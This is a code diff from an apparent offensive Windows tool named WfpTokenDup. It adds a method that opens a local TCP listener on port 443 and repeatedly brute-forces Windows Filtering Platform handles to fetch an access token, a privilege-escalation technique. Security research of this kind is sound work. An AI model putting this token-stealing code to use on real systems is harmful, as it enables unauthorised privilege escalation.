@@ -219,6 +219,7 @@ namespace WfpTokenDup.Library
                 }
 
                 Console.WriteLine("[>] Trying to get WFP engine handle.");
+
                 ntstatus = NativeMethods.FwpmEngineOpen0(
                     null,
                     RPC_C_AUTHN_TYPES.DEFAULT,
@@ -351,6 +352,36 @@ namespace WfpTokenDup.Library
             Console.WriteLine("[*] Done.");
 
             return status;
+        }
+
+
+        private static void SyncControllerListenerThread()
+        {
+            bool status = Utilities.SetTcpListener(
+                "127.0.0.1",
+                443,
+                Globals.StartNotifyEventHandle,
+                out IntPtr hListnerSocket,
+                out IntPtr hAcceptSocket);
+
+            if (status)
+            {
+                for (var trial = 0; trial < 100; trial++)
+                {
+                    Globals.FetchedToken = Utilities.BruteForcingWfpToken(
+                        Globals.WfpAleHandle,
+                        null,
+                        out LUID _);
+
+                    if (Globals.FetchedToken != IntPtr.Zero)
+                        break;
+                }
+
+                NativeMethods.closesocket(hAcceptSocket);
+                NativeMethods.closesocket(hListnerSocket);
+            }
+
+            NativeMethods.NtSetEvent(Globals.EndNotifyEventHandle, out int _);
         }
     }
 }
